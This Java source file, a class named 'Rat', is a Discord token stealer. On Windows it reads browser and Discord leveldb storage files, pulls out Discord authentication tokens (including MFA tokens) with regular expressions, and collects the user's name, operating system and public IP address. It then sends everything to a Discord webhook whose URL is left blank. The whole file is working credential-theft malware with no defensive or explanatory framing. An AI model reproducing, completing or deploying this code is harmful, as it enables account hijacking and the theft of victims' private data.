package org.example;
import club.minnced.discord.webhook.WebhookClient;
import club.minnced.discord.webhook.send.WebhookEmbed;
import club.minnced.discord.webhook.send.WebhookEmbedBuilder;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.*;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.MatchResult;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;
import java.util.stream.Stream;


public class Rat {

    private static final List<String> discordTokens = new ArrayList<>();

    private static final Pattern mfaRegex = Pattern.compile("mfa\\.[\\w-]{84}");
    private static final Pattern defaultRegex = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38}");

    public static void main(String[] args) {
        String os = System.getProperty("os.name");
        String ip = "Not Found";
        String name = "Not Found";
        String address = "Not Found";


        try {
            URL whatismyip = new URL("http://checkip.amazonaws.com");
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(
                    whatismyip.openStream()));
            ip = bufferedReader.readLine();
            name = System.getProperty("user.name");
            URL whatismyaddress = new URL("https://whatismyaddress.net/");
        } catch (UnknownHostException e) {
        } catch (MalformedURLException e) {
        } catch (IOException e) {
        }





        if (os.contains("Windows")) {
            List<String> paths = new ArrayList<>();
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb/");

            for (String path : paths) {
                File dir = new File(path);

                String[] files = dir.list();

                if (files == null) continue;

                for (String pathname : files) {
                    try {
                        FileInputStream fis = new FileInputStream(path + pathname);
                        StringBuilder str = new StringBuilder();
                        int data;

                        while ((data = fis.read()) != -1)
                            str.append((char) data);


                        fis.close();

                        List<String> tokensList = new ArrayList<>();

                        Matcher def = defaultRegex.matcher(str.toString());
                        Matcher mfa = mfaRegex.matcher(str.toString());

                        // Scanning for non-MFA Tokens



                        while(def.find()) {
                            tokensList.add(def.group());
                        }





                        discordTokens.addAll(tokensList);
                        tokensList.clear();

                        // Scanning for MFA Tokens
                        while(mfa.find()) {
                            tokensList.add(mfa.group());
                        }


                        discordTokens.addAll(tokensList);
                        tokensList.clear();
                    } catch (IOException e) {e.printStackTrace();
                    }
                }
            }
        }


        WebhookClient client = WebhookClient.withUrl("");
        WebhookEmbedBuilder builder = new WebhookEmbedBuilder()
                .setColor(0x9667)
                .setTitle(new WebhookEmbed.EmbedTitle("User Info", null))
                .addField(new WebhookEmbed.EmbedField(false, "Operating System: ", os))
                .addField(new WebhookEmbed.EmbedField(false, "Name: ", name))
                .addField(new WebhookEmbed.EmbedField(false, "IP Address: ", ip));

        if (discordTokens.size() == 0)
            builder.addField(new WebhookEmbed.EmbedField(false, "Discord Tokens: ", "empty"));
        else if (discordTokens.size() == 1)
            builder.addField(new WebhookEmbed.EmbedField(false, "Discord Token: ", discordTokens.get(0)));
        else {
            for (int i = 0; i < discordTokens.size(); i++)
                builder.addField(new WebhookEmbed.EmbedField(false, "Token " + (i + 1) + ": ", discordTokens.get(i)));
        }

        client.send(builder.build());

    }
}

